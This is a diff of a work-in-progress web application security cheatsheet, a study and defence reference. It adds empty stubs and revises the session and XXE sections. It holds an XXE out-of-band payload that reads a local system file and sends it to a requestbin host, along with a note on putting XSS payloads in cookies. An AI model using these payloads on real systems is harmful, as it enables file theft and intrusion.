@@ -9,8 +9,9 @@ Web Application Security Cheatsheet
 - [XML - XML External Entities (XXE)](#xml--xml-external-entities)  
 - [PHP Un-serialization](#php-un-serialize)  
 - [Cross-Site Scripting (XSS)](#cross-site-scripting)  
-- [Advanced XSS - Single Origin Policy (SOP)](#advanced-xss---same-origin-policy)  
-- [Advanced XSS - Content Security Policy (CSP)](#advanced-xss---content-security-policy)
+- [Advanced XSS - Sandbox Escapes](#advanced-xss---sandbox-escapes)  
+- [Advanced XSS - Single Origin Policy (SOP)](#advanced-xss---same-origin-policy-bypass)  
+- [Advanced XSS - Content Security Policy (CSP)](#advanced-xss---content-security-policy-bypass)
 
 ## Content
 
@@ -26,7 +27,6 @@ _REQUEST: Server -> Client_
 
 _REQUEST: Client -> Server_  
 ![Client -> Server](Resources/Cookie2.png)  
-
 
 
 **Exploitation**  
@@ -45,22 +45,38 @@ Session Clean-Up:
 * Check / change cookie expiration.
 
 XXS via. cookies:
-* 
-
+* Insert XSS payload into cookie content.
 
 **Mitigation**  
 
+Session Creation:
+* New tokens should be issued on login / privilege change.  
+
+Session Clean-up:
+* 
+
 Perform server-side validation of a user's session.  
-New tokens should be issued on login / privilege change.  
+  
 Don't reveal session tokens in a URL parameter.  
 Destroy sessions tokens appropriately: implement token expiration, avoid token re-use.  
 Disable web-browser cross-tab sessions.  
 Force session logout on web browser window close events.  
 
 
-
 ### Authentication - OAuth
 ---
+
+**Summary**  
+
+
+
+**Exploitation**  
+
+
+
+**Mitigation**  
+
+
 
 ### Authentication - SAML
 ---
@@ -87,6 +103,7 @@ Modifying SAML Attributes
 
 <a href="https://www.owasp.org/index.php/Authentication_Cheat_Sheet">OWASP Auth Cheatsheet</a><br>
 <a href="https://www.owasp.org/index.php/SAML_Security_Cheat_Sheet">OWASP SAML Security Cheatsheet</a>
+
 
 ### XML – XML External Entities
 ---
@@ -151,11 +168,10 @@ XXE Out of Bounds attack (XXE OOB) - Sending the response/data to your own serve
   <data>&send;</data>
   ```
   ```xml
-  <!ENTITY % file SYSTEM "file:///etc/hosts">
+  <!ENTITY % file SYSTEM "file:///c:/boot.ini">
   <!ENTITY % all "<!ENTITY send SYSTEM 'https://requestbin.fullcontact.com/1cxrgsm1/?%file;'>">
   &all;
   ```
-
 
 **Exploitation: PHP-based** 
 
@@ -168,12 +184,9 @@ PHP Filters
   http:// — Accessing HTTP(s) URLs
   ftp:// — Accessing FTP(s) URLs
   php:// — Accessing various I/O streams
-  zlib:// — Compression Streams
   data:// — Data (RFC 2397)
   glob:// — Find pathnames matching pattern
-  phar:// — PHP Archive
   ssh2:// — Secure Shell 2
-  rar:// — RAR
   ```  
 
 **Exploitation: Other Tricks**
@@ -185,8 +198,7 @@ _Encoding_: Change encoding e.g. UTF-8 -> UTF-16 `<?xml version="1.0" encoding="
 **Mitigation**
 
 IF POSSIBLE: Disable DTD's (`<!DOCTYPE x [ ]>`).  
-ELSE :Disallow loading XML external entities.  
-
+ELSE: Disallow loading XML external entities (entities with queries to external resources).  
 
 
 ### PHP Un-serialize
@@ -256,10 +268,34 @@ Do not use unserialize() function with user-supplied input, use JSON functions i
 ### Cross-Site Scripting
 ---
 
-### Advanced XSS - Same Origin Policy
+**Summary**
+
+**Exploitation**
+
+**Mitigation**
+
+
+### Advanced XSS - Sandbox Escapes
 ---
 
-### Advanced XSS - Content Security Policy
+**Summary**  
+
+**Exploitation**  
+
+**Mitigation**
+
+
+### Advanced XSS - Same Origin Policy Bypass
+---
+
+**Summary**  
+
+**Exploitation**  
+
+**Mitigation**
+
+
+### Advanced XSS - Content Security Policy Bypass
 ---  
 
 **Summary**  
@@ -282,5 +318,39 @@ _JSONP_: including controlled JavaScript on the domain.
 _Polyglots_: CSP Bypass using Polyglot jpeg/javascript
 
 **Mitigation**
+
+
+### SQL Injection
+---  
+
+**Summary**  
+
+**Exploitation**  
+
+**Mitigation**
+
+
+### Advanced Injection
+---  
+
+**Summary**  
+
+**Exploitation**  
+
+**Mitigation**
+
+
+### Amazon Web Services and Cloud
+---  
+
+**Summary**  
+
+**Exploitation**  
+
+**Mitigation**
+
+
+
+
 
 
